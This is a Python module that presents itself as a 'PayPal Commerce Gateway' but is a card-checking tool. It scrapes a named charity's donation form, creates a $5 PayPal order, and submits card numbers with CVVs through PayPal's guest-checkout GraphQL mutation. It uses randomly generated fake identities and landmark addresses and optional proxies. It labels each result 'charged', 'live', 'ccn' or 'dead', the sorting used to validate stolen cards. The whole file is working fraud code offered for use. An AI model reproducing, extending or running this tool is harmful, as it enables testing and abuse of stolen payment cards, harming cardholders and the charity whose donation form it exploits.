"""
PayPal Commerce Gateway - GraphQL mutation flow from chk/paypal5$.py.
"""

import re
import json
import random
import time
from typing import Dict, Any, Optional
from datetime import datetime
import httpx


class _ClientCtx:
    def __init__(self, proxy=None):
        self._proxy = proxy
    async def __aenter__(self):
        limits = httpx.Limits(max_connections=50, max_keepalive_connections=20)
        self._client = httpx.AsyncClient(timeout=25.0, proxy=self._proxy, follow_redirects=True, limits=limits)
        return self._client
    async def __aexit__(self, *args):
        pass

class PayPalGateway:
    name = "paypal"
    display_name = "PayPal Commerce"

    supported_cards = ["visa", "mastercard", "amex", "discover"]
    supported_currencies = ["USD"]

    DONATE_URL = "https://www.brightercommunities.org/donate-form/"
    AJAX_URL = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    GRAPHQL_URL = "https://www.paypal.com/graphql?fetch_credit_form_submit="

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"

    _FIRST = ("James", "John", "Robert", "Michael", "David", "Sarah", "Emma", "Olivia")
    _LAST = ("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis")
    _STREETS = ("1600 Pennsylvania Ave NW", "350 Fifth Avenue", "233 S Wacker Dr", "1 Infinite Loop", "1 Microsoft Way")
    _CITIES = ("Washington", "New York", "Chicago", "Cupertino", "Redmond")
    _STATES = ("DC", "NY", "IL", "CA", "WA")
    _ZIPCODES = ("20500", "10118", "60606", "95014", "98052")

    @classmethod
    def _fake_name(cls) -> str:
        return f"{random.choice(cls._FIRST)} {random.choice(cls._LAST)}"

    @classmethod
    def _fake_email(cls) -> str:
        return f"{random.choice(cls._FIRST).lower()}{random.randint(10, 9999)}@gmail.com"

    @classmethod
    def _fake_address(cls) -> Dict:
        idx = random.randint(0, len(cls._STREETS) - 1)
        return {
            "line1": cls._STREETS[idx], "city": cls._CITIES[idx],
            "state": cls._STATES[idx], "postal_code": cls._ZIPCODES[idx],
        }

    @classmethod
    async def process(
        cls,
        card_number: str,
        exp_month: int,
        exp_year: int,
        cvv: str,
        amount: float = 5.0,
        currency: str = "USD",
        **kwargs
    ) -> Dict[str, Any]:
        proxy = kwargs.get("proxy")
        t0 = time.time()
        try:
            card_type = cls._detect_card_type(card_number)
            if card_type not in cls.supported_cards:
                return {"status": "error", "success": False, "message": f"PayPal does not support {card_type}", "gateway": cls.name}

            if exp_year > 99:
                exp_year = exp_year % 100

            cc = card_number.replace(" ", "").replace("-", "")
            mm = str(exp_month).zfill(2)
            yy = str(exp_year)
            name_parts = cls._fake_name().split()
            first_name, last_name = name_parts[0], name_parts[-1]
            email = cls._fake_email()
            addr = cls._fake_address()

            async with _ClientCtx(proxy) as client:
                # Step 1: Get form hash, form_id, prefix
                page_resp = await client.get(
                    cls.DONATE_URL,
                    headers={"User-Agent": cls.UA},
                )
                if page_resp.status_code != 200:
                    return {"status": "error", "success": False, "message": "Failed to load donate page", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                html = page_resp.text
                hash_m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
                form_id_m = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
                prefix_m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)

                if not hash_m or not form_id_m or not prefix_m:
                    return {"status": "error", "success": False, "message": "Form data not found", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                form_hash = hash_m.group(1)
                form_id = form_id_m.group(1)
                prefix = prefix_m.group(1)

                # Step 2: Create PayPal order
                order_resp = await client.post(
                    cls.AJAX_URL,
                    data={
                        "give-form-id-prefix": prefix, "give-form-id": form_id,
                        "give-form-minimum": "5.00", "give-form-hash": form_hash,
                        "give-amount": "5.00", "give_first": first_name,
                        "give_last": last_name, "give_email": email,
                    },
                    headers={"User-Agent": cls.UA},
                )
                if order_resp.status_code != 200:
                    return {"status": "error", "success": False, "message": "Order creation failed", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                order_data = order_resp.json()
                paypal_id = order_data.get("data", {}).get("id")
                if not paypal_id:
                    return {"status": "error", "success": False, "message": "No PayPal ID", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                # Step 3: Submit card via GraphQL
                card_info = {"visa": "VISA", "mastercard": "MASTER_CARD", "amex": "AMEX", "discover": "DISCOVER"}.get(card_type, "Unknown")
                graphql_payload = {
                    "query": "\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n",
                    "variables": {
                        "token": paypal_id,
                        "card": {
                            "cardNumber": cc, "type": card_info,
                            "expirationDate": f"{mm}/20{yy}",
                            "postalCode": addr["postal_code"],
                            "securityCode": cvv,
                        },
                        "phoneNumber": f"+1{random.randint(200,999)}{random.randint(1000,9999)}",
                        "firstName": first_name, "lastName": last_name,
                        "billingAddress": {
                            "givenName": first_name, "familyName": last_name,
                            "country": "US", "line1": addr["line1"], "line2": "",
                            "city": addr["city"], "state": addr["state"],
                            "postalCode": addr["postal_code"],
                        },
                        "shippingAddress": {
                            "givenName": first_name, "familyName": last_name,
                            "country": "US", "line1": addr["line1"], "line2": "",
                            "city": addr["city"], "state": addr["state"],
                            "postalCode": addr["postal_code"],
                        },
                        "email": email, "currencyConversionType": "PAYPAL",
                    },
                    "operationName": None,
                }

                gql_resp = await client.post(
                    cls.GRAPHQL_URL,
                    content=json.dumps(graphql_payload),
                    headers={"User-Agent": cls.UA, "Content-Type": "application/json"},
                )
                elapsed = round(time.time() - t0, 2)
                text = gql_resp.text

                if "accessToken" in text or "cartId" in text:
                    return {"status": "charged", "success": True, "message": "Charged $5.00", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "amount": 5.0, "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "INVALID_SECURITY_CODE" in text:
                    return {"status": "ccn", "success": False, "message": "CVV2 Failure", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "RISK_DISALLOWED" in text:
                    return {"status": "dead", "success": False, "message": "Risk Disallowed", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "ISSUER_DECLINE" in text:
                    return {"status": "dead", "success": False, "message": "Issuer Decline", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "EXPIRED_CARD" in text:
                    return {"status": "dead", "success": False, "message": "Expired Card", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "INVALID_BILLING_ADDRESS" in text:
                    return {"status": "live", "success": True, "message": "Insufficient Funds", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "EXISTING_ACCOUNT_RESTRICTED" in text:
                    return {"status": "dead", "success": False, "message": "Account Restricted", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "ISSUER_DATA_NOT_FOUND" in text:
                    return {"status": "dead", "success": False, "message": "Issuer Data Not Found", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                elif "GRAPHQL_VALIDATION_FAILED" in text:
                    return {"status": "error", "success": False, "message": "GraphQL Validation Failed", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                else:
                    return {"status": "error", "success": False, "message": text[:100], "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}

        except Exception as e:
            return {"status": "error", "success": False, "message": f"PayPal error: {str(e)}", "gateway": cls.name, "time": round(time.time() - t0, 2), "timestamp": datetime.now().isoformat()}

    @classmethod
    def _detect_card_type(cls, card_number: str) -> str:
        card_number = card_number.replace(" ", "").replace("-", "")
        if card_number.startswith("4"):
            return "visa"
        elif card_number.startswith(("51", "52", "53", "54", "55")):
            return "mastercard"
        elif card_number.startswith(("34", "37")):
            return "amex"
        elif card_number.startswith("6011") or card_number.startswith("65"):
            return "discover"
        return "unknown"

    @classmethod
    async def test_connection(cls) -> Dict:
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.get(cls.DONATE_URL)
                return {"success": resp.status_code == 200, "gateway": cls.name, "message": "PayPal reachable", "status": "online"}
        except Exception as e:
            return {"success": False, "gateway": cls.name, "message": str(e), "status": "offline"}
